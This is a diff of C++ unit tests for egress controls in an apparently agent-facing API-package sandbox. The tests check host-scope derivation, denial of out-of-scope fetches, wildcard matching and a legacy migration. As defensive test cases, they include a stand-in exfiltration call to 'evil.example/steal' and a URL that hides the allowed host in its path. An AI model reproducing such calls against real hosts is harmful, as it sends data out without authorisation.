@@ -152,7 +152,8 @@ struct Fixture {
 };
 
 // Installs a package shaped for these tests.
-ApiPackage InstallFixturePkg(Fixture& fx, const std::string& extra = "") {
+ApiPackage InstallFixturePkg(Fixture& fx, const std::string& extra = "",
+                             const std::string& egressField = "") {
     std::string manifest = R"({
       "kind": "api_package", "name": "testpkg", "version": "0.1.0",
       "description": "fixture",
@@ -188,12 +189,20 @@ ApiPackage InstallFixturePkg(Fixture& fx, const std::string& extra = "") {
     while ((p = manifest.find("PORT")) != std::string::npos)
         manifest.replace(p, 4, std::to_string(fx.port));
     (void)url;
-    // insert extra commands before the closing "]"
+    // insert extra commands before the closing "]" (FIRST — its anchor
+    // "],\n connections" must not be shadowed by later injections)
     if (!extra.empty()) {
         size_t cend = manifest.find(
             "],\n      \"connections\"");
         assert(cend != std::string::npos);
         manifest.insert(cend, "," + extra);
+    }
+    // inject an egress_hosts field when requested (#25 tests)
+    if (!egressField.empty()) {
+        size_t cpos = manifest.find("      \"connections\": []");
+        assert(cpos != std::string::npos);
+        manifest.replace(cpos, 0,
+                         "      \"egress_hosts\": " + egressField + ",\n");
     }
     ApiPackage pkg = fx.store.InstallFromManifest(manifest);
     fx.store.SetPackageEnabled(pkg.id, true);
@@ -459,6 +468,8 @@ int TestSandboxStateAndSecrets() {
            "secret-derived escaping file path cannot leak via error message");
     Assert(!r8.isMember("files"), "rejected files array stripped from error response");
 
+
+
     // #23 audit round 4: sibling-directory containment — prefix-matching path
     // outside the package root must be rejected (component-aware check)
     {
@@ -493,6 +504,92 @@ int TestSandboxStateAndSecrets() {
     }
     return 0;
 }
+
+static int TestEgressControl() {
+    std::cout << "  [runtime] #25 egress scope: derivation, enforcement, wildcards, sweep...\n";
+    // 1) derivation: fixture manifest (no egress_hosts) derives the transport
+    //    host from state_schema defaults — existing template packages keep working
+    {
+        Fixture fx;
+        InstallFixturePkg(fx);
+        auto pkg = fx.store.GetPackageByName("testpkg");
+        Assert(pkg->egress_hosts.find("127.0.0.1") != std::string::npos,
+               "egress scope auto-derived from url templates");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent", Json::Value());
+        Assert(r["success"].asBool(), "derived scope admits the transport url");
+    }
+    // 2) declared narrow scope: transport to a different host is denied loudly
+    //    (rejected before any network I/O)
+    {
+        Fixture fx;
+        std::string extra = R"({"name": "outside", "kind": "action", "description": "d",
+            "request": {"method": "GET", "url": "https://other.example/x"},
+            "script": "function run(ctx) return {output='unreachable'} end"})";
+        InstallFixturePkg(fx, extra, R"(["api.example.com"])");
+        auto r = fx.runtime->ExecuteAction("testpkg", "outside", "agent", Json::Value());
+        Assert(!r["success"].asBool(), "out-of-scope transport denied");
+        Assert(r["error"].asString().find("egress denied") != std::string::npos &&
+                   r["error"].asString().find("other.example") != std::string::npos,
+               "denial names the host");
+    }
+    // 3) sandbox secondary fetch: same scope, script-visible result
+    {
+        Fixture fx;
+        std::string extra = R"({"name": "net", "kind": "action", "description": "d",
+            "script": "function run(ctx) local r = ctx.http.get('https://evil.example/steal') return {output='status '..tostring(r.status), err=tostring(r.error)} end"})";
+        InstallFixturePkg(fx, extra, R"(["api.example.com"])");
+        auto r = fx.runtime->ExecuteAction("testpkg", "net", "agent", Json::Value());
+        Assert(r["output"].asString() == "status 0", "sandbox fetch denied with status 0");
+        Assert(r["err"].asString().find("egress denied") != std::string::npos,
+               "sandbox denial carries reason");
+        // in-scope sandbox fetch passes the gate (fixture server on 127.0.0.1)
+        std::string extra2 = R"({"name": "net2", "kind": "action", "description": "d",
+            "script": "function run(ctx) local r = ctx.http.get('http://127.0.0.1:@PORT@/v2/positions') return {output='status '..tostring(r.status)} end"})";
+        extra2.replace(extra2.find("@PORT@"), 6, std::to_string(fx.port));
+        InstallFixturePkg(fx, extra2, R"(["127.0.0.1"])");
+        auto r2 = fx.runtime->ExecuteAction("testpkg", "net2", "agent", Json::Value());
+        Assert(r2["output"].asString() == "status 200", "in-scope sandbox fetch allowed");
+    }
+    // 4) wildcard + exact semantics of the matcher
+    {
+        std::vector<std::string> scope = {"api.example.com", "*.internal.test"};
+        std::string h;
+        Assert(ApiRuntime::EgressAllowed(scope, "https://api.example.com/v2/x", h) &&
+                   h == "api.example.com", "exact match");
+        Assert(ApiRuntime::EgressAllowed(scope, "https://node.internal.test/a", h),
+               "wildcard matches subdomain");
+        Assert(!ApiRuntime::EgressAllowed(scope, "https://internal.test/a", h),
+               "wildcard does not match bare domain");
+        Assert(!ApiRuntime::EgressAllowed(scope, "https://xapi.example.com/a", h),
+               "exact match has no implicit subdomains");
+        Assert(!ApiRuntime::EgressAllowed(scope, "https://evil.example/api.example.com", h),
+               "host extraction does not match path substrings");
+        Assert(!ApiRuntime::EgressAllowed({}, "https://api.example.com/x", h),
+               "empty scope denies all");
+        Assert(!ApiRuntime::EgressAllowed(scope, "api.example.com/x", h),
+               "schemeless url denied");
+        Assert(ApiRuntime::EgressAllowed(scope, "https://user:pw@api.example.com/x", h),
+               "userinfo stripped before match");
+    }
+    // 5) legacy sweep: a pre-#25 package ('[]' scope) is re-derived at store
+    //    construction — no hard break on upgrade
+    {
+        Fixture fx;
+        InstallFixturePkg(fx);
+        {
+            auto stmt = fx.db.Prepare("UPDATE api_packages SET egress_hosts = '[]'");
+            Assert(stmt && stmt->ExecDML(), "scope reset to legacy state");
+        }
+        ApiPackageStore store2{&fx.db};  // EnsureSchema -> MigrateEgressScopes
+        auto pkg = store2.GetPackageByName("testpkg");
+        Assert(pkg->egress_hosts.find("127.0.0.1") != std::string::npos,
+               "legacy scope re-derived by migration sweep");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent", Json::Value());
+        Assert(r["success"].asBool(), "post-sweep transport admitted");
+    }
+    return 0;
+}
+
 
 int TestSandboxGlobals() {
     std::cerr << "  [runtime] globals whitelist, json/b64, instruction limit...\n";
@@ -581,7 +678,6 @@ int TestHookContext() {
     return 0;
 }
 
-
 }  // namespace
 
 int main() {
@@ -590,6 +686,7 @@ int main() {
     TestArgsValidation();
     TestPrimaryTransport();
     TestSandboxStateAndSecrets();
+    TestEgressControl();
     TestSandboxGlobals();
     TestFsAndHttpBudget();
     TestHookContext();
